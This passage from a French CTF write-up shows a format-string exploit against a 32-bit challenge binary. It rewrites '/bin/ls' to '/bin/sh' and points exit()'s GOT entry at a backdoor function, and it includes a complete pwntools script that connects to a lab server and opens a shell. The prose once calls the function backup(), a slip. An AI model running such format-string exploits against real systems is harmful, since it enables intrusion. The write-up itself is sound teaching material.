+</span></span><span class="line"><span class="cl">Fortify :    ✘ 
+</span></span><span class="line"><span class="cl">RelRO   :    Partial</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Dans tous les cas on part du principe que <strong>l&rsquo;ASLR</strong> est actif. De plus, comme le chall est en remote, on a pas les détails de l&rsquo;environnement dans lequel run le binaire, donc c&rsquo;est trop foireux de se baser sur des adresses hardcodées de la stack.</p>
+<p>Par contre, l&rsquo;abscence de <strong>RelRO</strong> et de <strong>PIE</strong> nous permet non seulement de localiser la <strong>GOT</strong> à coup sûr, mais aussi d&rsquo;y accéder en écriture. On peut donc envisager d&rsquo;overwrite certaines entrées de la GOT afin d&rsquo;obtenir notre shell.</p>
+<p>Enfin on a une fonction <em>backdoor()</em> qui lance un <em>system(&quot;/bin/ls&quot;)</em>. La string <em>&quot;/bin/ls&quot;</em> étant dans la section <em>.data</em>, on peut la changer pour <em>&quot;/bin/sh&quot;</em> avant de rediriger le flow d&rsquo;execution vers <em>backdoor()</em>.</p>
+<h2 id="exploitation" class="heading-element">
+  <a href="#exploitation" class="heading-mark"></a>Exploitation</h2><p>Notre exploit va se faire en 3 étapes:</p>
+<ol>
+<li>Trouver à quel offset notre input se trouve sur la stack, au moment du call à <em>printf()</em></li>
+<li>Overwrite <em>&quot;/bin/ls&quot;</em> avec <em>&quot;/bin/sh&quot;</em></li>
+<li>Overwrite l&rsquo;entrée de <em>exit()</em> dans la <strong>GOT</strong> avec l&rsquo;adresse de <em>backup()</em></li>
+</ol>
+<h3 id="input-offset" class="heading-element">
+  <a href="#input-offset" class="heading-mark"></a>Input offset</h3><p>Pour trouver l&rsquo;offset, tout ce qu&rsquo;on a à faire est de lancer le programme, <strong>break</strong> au moment du <em>printf()</em> vulnérable et regarder à quelle distance de <strong>$ESP</strong> se trouve notre input. Pour repérer facilement notre input, on va envoyer <em>&ldquo;aaaaaaa&hellip;&rdquo;</em> comme clé.
+<img loading="lazy" src="/images/beaufort_gdb.png" alt="Malloc from Top Chunk" srcset="/images/beaufort_gdb.png?size=small, /images/beaufort_gdb.png?size=medium 1.5x, /images/beaufort_gdb.png?size=large 2x" sizes="auto" data-title="Malloc from Top Chunk" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>On voit que notre input est à $0$x$78$ bytes de <strong>$ESP</strong>, soit en 32 bits, $30*4$ bytes. Notre offset est donc 30.</p>
+<h3 id="the-exploit" class="heading-element">
+  <a href="#the-exploit" class="heading-mark"></a>The Exploit</h3><p>Pour ce qui est de l&rsquo;exploit, on va utiliser le module <em>fmtstr</em> de <em>Pwntools</em> et plus particulièrement la fonction <em>fmtstr_payload()</em>. Il nous suffit simplement de lui passer comme argument l&rsquo;offset de notre input ainsi qu&rsquo;un dictionnaire des adresses et des valeurs qu&rsquo;on souhaite écrire.</p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="n">writes</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>L&rsquo;adresse de <em>&quot;/bin/ls&quot;</em> est <em>0x0804c024</em>. On va donc écrire <em>&ldquo;sh&rdquo;</em> à <em>0x0804c029</em>, ce qui nous donnera <em>&quot;/bin/sh&quot;</em>.
+Enfin on va réécrire l&rsquo;entrée de <em>exit()</em> dans la <strong>GOT</strong> par l&rsquo;adresse de la fonction <em>backup()</em>.</p>
+<div class="highlight" id="id-3"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">writes</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x0804c029</span><span class="p">:</span> <span class="mh">0x00006873</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">		   <span class="n">elfexe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]:</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ce qui donne comme exploit final :</p>
+<div class="highlight" id="id-4"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3.9 </span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfexe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./beaufort.bin&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">elf_path</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">path</span> 
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">		<span class="n">remote_server</span> <span class="o">=</span> <span class="s1">&#39;10.22.148.11&#39;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">remote_port</span> <span class="o">=</span> <span class="mi">1341</span>
+</span></span><span class="line"><span class="cl">		<span class="n">target</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_server</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">		<span class="n">target</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">elf_path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">target</span> 
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl"><span class="c1">#=========================================================== </span>
+</span></span><span class="line"><span class="cl"><span class="c1"># EXPLOIT GOES HERE </span>
+</span></span><span class="line"><span class="cl"><span class="c1">#=========================================================== </span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span> 
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">payload</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;_&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x64</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="n">arguments</span> <span class="o">=</span> <span class="p">[]</span> 
+</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">(</span><span class="n">arguments</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">writes</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x0804c029</span><span class="p">:</span> <span class="mh">0x00006873</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">		  <span class="n">elfexe</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;exit&#39;</span><span class="p">]:</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x60</span> 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span> <span class="n">writes</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.125.3"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2-RC"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><a href="https://github.com/0xEg0/MyLittlePwney" title="View source on GitHub"target="_blank" rel="external nofollow" class="github-corner right d-none-mobile"><svg viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"No results found","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false}};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-E5LRZC34M1', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-E5LRZC34M1" async></script></body>
+</html>
